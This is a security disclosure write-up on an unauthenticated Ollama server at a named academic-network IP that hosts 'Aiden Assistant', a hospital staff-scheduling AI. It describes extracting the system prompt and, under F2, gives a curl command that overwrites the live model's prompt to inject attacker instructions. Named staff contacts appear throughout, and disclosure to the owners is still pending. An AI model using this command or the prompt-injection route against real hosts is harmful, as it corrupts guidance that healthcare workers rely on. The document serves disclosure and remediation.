# NCU / TANet Taoyuan — Production Medical Scheduling SaaS System Prompt Fully Exposed

_NuClide Research · 2026-05-01_

---

## Summary

A server on the TANet Taoyuan Regional Network (National Central University segment, 163.25.105.115) hosts two custom Ollama models — `aiden-deepseek:latest` and `aiden:latest` — that are the AI backend of **Aiden Assistant**, a production medical staff scheduling SaaS product. The system was developed by Professor Wu Kan at Chang Gung University under the company **Oplentia** and is actively deployed at **Linkou Chang Gung Memorial Hospital** (pharmacy and orthopedics departments).

The Ollama API is completely unauthenticated. The full proprietary system prompt is extractable via `/api/show`, exposing the entire product's business logic, role hierarchy, UI navigation guide, scheduling rules, and live support contact information.

---

## Infrastructure

| Field | Value |
|---|---|
| IP | 163.25.105.115 |
| Network | TANet Taoyuan Regional Network (National Central University — No.300 Jhongda Rd., Jhongli City, Taoyuan) |
| Open ports | 11434 (Ollama — public) |
| Org | Ministry of Education Computer Center (MOEC) / NCU |

---

## Models

| Model | Base | Size | Notes |
|---|---|---|---|
| `aiden-deepseek:latest` | Qwen3 8.2B | 4GB | Aiden Assistant — medical scheduling |
| `aiden:latest` | Gemma4 8.0B | 8GB | Aiden Assistant — alternate base |
| `deepseek-r1:8b` | DeepSeek-R1 | 4GB | — |
| `gemma4:31b` | Gemma4 | 18GB | — |
| `gemma4:latest` | Gemma4 | 8GB | — |
| `nomic-embed-text:latest` | — | — | RAG embedding pipeline |
| `llama3.1:latest` | Llama 3.1 | 4GB | — |
| `llama3.1:8b` | Llama 3.1 | 4GB | — |
| `llama3:latest` | Llama 3 | 4GB | — |

---

## Findings

### F1 — Production Medical SaaS System Prompt Fully Exposed (CRITICAL)

The `/api/show` endpoint returns the complete Aiden Assistant system prompt without authentication. This prompt contains the full proprietary business logic for a production healthcare scheduling system, including:

**Exposed operator identity:**
- Product: **Aiden Assistant** — Smart Medical Scheduling System (智慧醫療排班系統)
- Developer: Professor **Wu Kan (吳侃)**, Chang Gung University / **TianXing Intelligence (天行智能)**
- Company: **Oplentia** (`janice.tsai@oplentia.com`)
- Production deployment: **Linkou Chang Gung Memorial Hospital** — Pharmacy and Orthopedics departments
- Support line: **(03) 211-8800 ext. 3183**
- Support email: **janice.tsai@oplentia.com**

**Exposed product architecture:**
- Full role hierarchy: TenantAdmin → Admin → Manager (部長) → Leader (組長) → Member (員工)
- Complete sidebar navigation map with `#sidebar-*` anchor IDs
- Tenant scoping: `骨科` (Orthopedics) and `藥劑部` (Pharmacy) tenant names exposed
- HIS integration endpoints and export format
- Surgery schedule configuration logic
- Shift rule system (接班間隔, 職級配置, 勞務積分)
- Leave management workflow

**Business impact of the prompt leak alone:**
- Competitor intelligence: full product feature set, constraints, and UX flow exposed
- The support contact `janice.tsai@oplentia.com` and phone number enable targeted social engineering against the vendor
- Tenant names reveal active hospital clients

**Excerpt from extracted system prompt:**
```
你是一位專業且關懷體恤醫療人員的「醫療排班系統 AI 助手」。
你的名字是「Aiden Assistant」。
...
如果無法解決可以讓使用者撥打客服電話：(03) 211-8800 分機 3183，
或者來信到：janice.tsai@oplentia.com
```

### F2 — CVE-2025-63389 Model Injection on Live Healthcare AI (CRITICAL)

The unauthenticated `/api/create` endpoint allows overwriting the `aiden-deepseek` or `aiden` system prompt. Any user of the deployed web interface who queries Aiden Assistant after such a write receives responses shaped by attacker-controlled instructions — with no indication the model has been modified.

**Attack surface:**
- Attacker could inject instructions telling healthcare workers incorrect scheduling rules
- Staff relying on Aiden Assistant for labor law compliance would receive wrong guidance
- Support phone/email in the prompt could be replaced with attacker-controlled contact info

```bash
# Overwrite Aiden Assistant system prompt
curl -X POST http://163.25.105.115:11434/api/create \
  -H "Content-Type: application/json" \
  -d '{
    "model": "aiden-deepseek:latest",
    "from": "aiden-deepseek:latest",
    "system": "Attacker-controlled scheduling instructions."
  }'
```

### F3 — RAG Embedding Pipeline Exposed

`nomic-embed-text:latest` is present, indicating an active RAG pipeline. Documents ingested into the vector store (likely scheduling policies, labor regulations, hospital procedures) are accessible via the unauthenticated API.

---

## Contextual Notes

The server resides on TANet's Taoyuan regional segment assigned to NCU's campus address. The Aiden Assistant product, however, is Chang Gung University / Oplentia IP. This suggests either:
- NCU is running a pilot or development instance of the Aiden system
- The product is being developed on NCU infrastructure

The TANet (Taiwan Academic Network) backbone is administered by the Ministry of Education and serves as the shared academic network for Taiwan's universities and research institutions.

**Second deployment observed:** A second TANet node was identified during the 2026-05-03 sweep returning Aiden Assistant responses (Chinese-language identity: "Aiden Assistant, 專注於協助醫療排班系統"). The `who_deployed` field on that node identified the operator as **TianXing Intelligence (天行智能)** / **Chang Gung University (長庚大學)** under Professor Lu Jia — consistent with the same vendor/SaaS product. The node went offline before a full case study could be completed. The two-node TANet footprint confirms Aiden Assistant is deployed at multiple institutions via the Chang Gung University TANet allocation.

---

## Remediation

```bash
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

For cloud deployments: `-p 127.0.0.1:11434:11434` in Docker.

Additionally, Oplentia should audit all deployment environments where Aiden Assistant is running to ensure no instances are internet-accessible.

---

## Disclosure

- **Discovered:** 2026-05-01
- **Status:** Pending outreach to NCU IT Security + Oplentia (janice.tsai@oplentia.com)
- **Secondary contact:** Chang Gung University IT / Professor Wu Kan's team
